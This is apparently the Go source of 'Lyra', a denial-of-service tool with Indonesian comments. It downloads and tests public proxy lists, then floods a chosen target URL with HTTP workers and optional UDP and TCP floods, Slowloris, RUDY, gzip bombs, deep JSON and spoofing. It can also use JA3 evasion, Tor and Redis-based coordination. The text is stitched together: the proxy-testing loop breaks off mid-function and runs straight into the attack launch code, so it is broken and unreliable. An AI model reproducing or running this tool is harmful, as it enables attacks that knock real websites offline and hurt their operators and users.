package main

import (
	"bufio"
	"bytes"
	"compress/gzip"
	"context"
	"crypto/tls"
	"encoding/json"
	"flag"
	"fmt"
	"io"
	"math/rand"
	"net"
	"net/http"
	"net/url"
	"os"
	"os/signal"
	"regexp"
	"strconv"
	"strings"
	"sync"
	"sync/atomic"
	"syscall"
	"time"

	"github.com/fatih/color"
	"github.com/redis/go-redis/v9"
	"golang.org/x/net/http2"
	"golang.org/x/net/proxy"
	"golang.org/x/term"
)

// ==================== BANNER (DENGAN WARNA) ====================
const BANNER = `
[0;37;40m                                                               [0m
[0;36;40m███[0;37;40m      [0;36;40m▄██▀▀▀██▄[0;96;46m██▓[0;96;40m▀▀▀[0;96;46m▓█[0;96;40m▄[0;96;46m██▓[0;96;40m▀▀▀[0;96;46m▓█[0;96;40m▄[0;37;40m  [0;36;40m▀▀▀▀██▄[0;37;40m     [0;36;40m▀███▄██▀▀▀██▄[0m
[0;36;40m███▀▀[0;37;40m    [0;36;40m███[0;37;40m [0;90;40m█[0;37;40m [0;36;40m███[0;96;46m██▒[0;37;40m [0;90;40m█[0;37;40m [0;96;46m▒█▓██▒[0;37;40m [0;90;40m█[0;37;40m [0;96;46m▒█▓[0;36;40m▄██▀▀▀███▄██▀▀▀██████[0;37;40m [0;90;40m█[0;37;40m [0;36;40m███[0m
[0;96;46m▓▒[0;36;40m█[0;37;40m [0;90;40m█[0;37;40m [0;36;40m▄▄▄[0;96;46m░▒[0;36;40m█[0;37;40m [0;90;40m█[0;37;40m [0;36;40m█[0;96;46m▒▓█▓░[0;37;40m [0;90;40m█[0;37;40m [0;36;40m▀▀▀[0;96;46m█▓░[0;37;40m [0;90;40m█[0;37;40m [0;96;46m░▓▒░▒[0;36;40m█[0;37;40m [0;90;40m█[0;37;40m [0;36;40m█[0;96;46m▒▓░▒[0;36;40m█[0;37;40m [0;90;40m█[0;37;40m [0;36;40m█[0;96;46m▒▓░▒[0;36;40m█[0;37;40m [0;90;40m█[0;37;40m [0;36;40m█[0;96;46m▒▓[0m
[0;96;46m█▓░[0;37;40m [0;90;40m█[0;37;40m [0;96;46m░▓▒▒▓░[0;37;40m [0;90;40m█[0;37;40m [0;96;46m░▓█▓▒[0;36;40m█[0;37;40m [0;90;40m████[0;37;40m [0;96;46m▓▒[0;36;40m█[0;37;40m [0;90;40m█[0;37;40m [0;36;40m█[0;96;46m▒░▒▓░[0;37;40m [0;90;40m█[0;37;40m [0;96;46m░▓█▒▓░[0;37;40m [0;90;40m█[0;37;40m [0;96;46m░▓█▒▓░[0;37;40m [0;90;40m█[0;37;40m [0;96;46m░▓█[0m
[0;96;46m██▒[0;37;40m [0;90;40m█[0;37;40m [0;96;46m▒█▓▓█▒[0;37;40m [0;90;40m█[0;37;40m [0;96;46m▒██[0;36;40m███[0;37;40m [0;90;40m████[0;37;40m [0;36;40m███[0;37;40m [0;90;40m█[0;37;40m [0;36;40m███[0;96;46m▓█▒[0;37;40m [0;90;40m█[0;37;40m [0;96;46m▒██▓█▒[0;37;40m [0;90;40m█[0;37;40m [0;96;46m▒██▓█▒[0;37;40m [0;90;40m█[0;37;40m [0;96;46m▒██[0m
[0;96;46m██▓[0;96;40m▄▄▄[0;96;46m▓█[0;96;40m▀▀[0;96;46m█▓[0;96;40m▄▄▄[0;96;46m▓█[0;96;40m▀[0;36;40m███[0;37;40m      [0;36;40m███[0;37;40m   [0;36;40m███[0;96;40m▀[0;96;46m█▓[0;96;40m▄▄▄[0;96;46m▓██[0;96;40m▀[0;96;46m█▓[0;96;40m▄▄▄[0;96;46m▓██[0;96;40m▀[0;96;46m█▓[0;96;40m▄▄▄[0;96;46m▓█[0;96;40m▀[0m
`

// ==================== GLOBAL VARIABLES ====================
var (
	targetURL     string
	workers       int
	duration      int
	methods       string
	enableHTTP2   bool
	enableProxy   bool
	enableTor     bool
	enableUDP     bool
	enableTCP     bool
	enableRedis   bool
	redisAddr     string
	enableSpoof   bool
	enableJA3     bool
	enableGzip    bool
	enableSlowloris bool
	enableDeepJSON bool
	enableRUDY    bool
	verbose       bool
	attackAll     bool
	proxyFile     string

	stats struct {
		total   uint64
		success uint64
		failed  uint64
	}
	mu          sync.Mutex
	proxyList   []string
	proxyIndex  int
	stopChan    chan struct{}
	wg          sync.WaitGroup
	rdb         *redis.Client
	ctx         = context.Background()
)

// ==================== FUNGSI BANTU UNTUK TERMINAL ====================
func getTerminalWidth() int {
	width, _, err := term.GetSize(int(os.Stdout.Fd()))
	if err != nil {
		return 80 // fallback
	}
	if width < 20 {
		return 20
	}
	return width
}

func stripANSI(s string) string {
	re := regexp.MustCompile(`\x1b\[[0-9;]*m`)
	return re.ReplaceAllString(s, "")
}

func truncateText(text string, maxLen int) string {
	if len(text) <= maxLen {
		return text
	}
	return text[:maxLen-3] + "..."
}

// ==================== PROXY MANAGER ====================
func fetchProxies() {
	if !enableProxy && proxyFile == "" {
		return
	}

	if proxyFile != "" {
		fmt.Printf("[*] Membaca proxy dari file: %s\n", proxyFile)
		file, err := os.Open(proxyFile)
		if err != nil {
			fmt.Printf("[!] Gagal buka file proxy: %v\n", err)
			return
		}
		defer file.Close()
		scanner := bufio.NewScanner(file)
		for scanner.Scan() {
			line := strings.TrimSpace(scanner.Text())
			if line != "" && strings.Contains(line, ":") {
				proxyList = append(proxyList, line)
			}
		}
		if len(proxyList) > 0 {
			fmt.Printf("[*] %d proxy dari file siap pakai.\n", len(proxyList))
			return
		}
		fmt.Println("[!] File proxy kosong, beralih ke download otomatis.")
	}

	fmt.Println("[*] Download proxy dari source...")
	client := &http.Client{
		Timeout: 10 * time.Second,
		Transport: &http.Transport{
			TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
		},
	}

	sources := []string{
		"https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all",
		"https://www.proxy-list.download/api/v1/get?type=http",
		"https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/http.txt",
		"https://raw.githubusercontent.com/clarketm/proxy-list/master/proxy-list-raw.txt",
		"https://proxylist.rip/proxy/http/format/txt/",
	}
	all := make(map[string]bool)
	for _, src := range sources {
		resp, err := client.Get(src)
		if err != nil {
			if verbose {
				fmt.Printf("[!] Gagal ambil %s: %v\n", src, err)
			}
			continue
		}
		body, err := io.ReadAll(resp.Body)
		resp.Body.Close()
		if err != nil {
			continue
		}
		for _, line := range strings.Split(string(body), "\n") {
			line = strings.TrimSpace(line)
			if strings.Contains(line, ":") && !strings.Contains(line, "[") && !strings.Contains(line, "#") {
				parts := strings.Split(line, ":")
				if len(parts) == 2 {
					if net.ParseIP(parts[0]) != nil {
						all[line] = true
					}
				}
			}
		}
	}
	for p := range all {
		proxyList = append(proxyList, p)
	}

	fmt.Printf("[*] Menguji %d proxy...\n", len(proxyList))
	alive := []string{}
	var muAlive sync.Mutex
	var wg sync.WaitGroup
	sem := make(chan struct{}, 50)
	for _, p := range proxyList {

	// Proxy
	if enableProxy || proxyFile != "" {
		fetchProxies()
		if len(proxyList) == 0 {
			fmt.Println("[!] Tidak ada proxy tersedia, lanjut tanpa proxy.")
			enableProxy = false
		}
	}

	stopChan = make(chan struct{})

	// ==================== START ATTACK ====================
	fmt.Printf("\n[🎯] Lyra sending threads to %s\n", targetURL)
	fmt.Printf("[🧨] Workers: %d, Duration: %ds\n", workers, duration)
	fmt.Printf("[⚙️] Methods: %v\n", methodList)
	fmt.Printf("[🚀] HTTP/2: %v, Proxy: %v, Tor: %v\n", enableHTTP2, enableProxy, enableTor)
	fmt.Printf("[☄️] UDP: %v, TCP: %v, Slowloris: %v\n", enableUDP, enableTCP, enableSlowloris)
	fmt.Printf("[💣] Gzip Bomb: %v, Deep JSON: %v, RUDY: %v\n", enableGzip, enableDeepJSON, enableRUDY)
	fmt.Printf("[🎆] Spoofing: %v, JA3: %v, Redis: %v\n", enableSpoof, enableJA3, enableRedis)
	

	// UDP/TCP/Slowloris background
	if enableUDP {
		go udpFlood(host, port)
	}
	if enableTCP {
		go tcpFlood(host, port)
	}
	if enableSlowloris {
		go slowlorisAttack(host, port)
	}
	if enableRedis {
		go redisListener()
	}

	// Stats printer (ADAPTIF dengan 🚀)
	go statsPrinter()

	// HTTP Workers
	for i := 0; i < workers; i++ {
		wg.Add(1)
		go httpWorker(methodList)
	}

	// Timeout / Interrupt
	sigChan := make(chan os.Signal, 1)
	signal.Notify(sigChan, syscall.SIGINT, syscall.SIGTERM)

	select {
	case <-time.After(time.Duration(duration) * time.Second):
		fmt.Println("\n[+] Attack selesai.")
	case <-sigChan:
		fmt.Println("\n[!] Dihentikan oleh pengguna.")
		if enableRedis && rdb != nil {
			rdb.Publish(ctx, "lyra_control", "STOP")
		}
	}

	close(stopChan)
	wg.Wait()

	// Final Stats
	total := atomic.LoadUint64(&stats.total)
	success := atomic.LoadUint64(&stats.success)
	failed := atomic.LoadUint64(&stats.failed)
	fmt.Println("\n" + strings.Repeat("=", 40))
	fmt.Println("           LYRA GO  REPORT")
	fmt.Println(strings.Repeat("=", 40))
	fmt.Printf("Total request   : %d\n", total)
	fmt.Printf("Success (2xx-3xx) : %d\n", success)
	fmt.Printf("Failed           : %d\n", failed)
	fmt.Printf("Success rate    : %.1f%%\n", float64(success)/float64(total)*100)
}
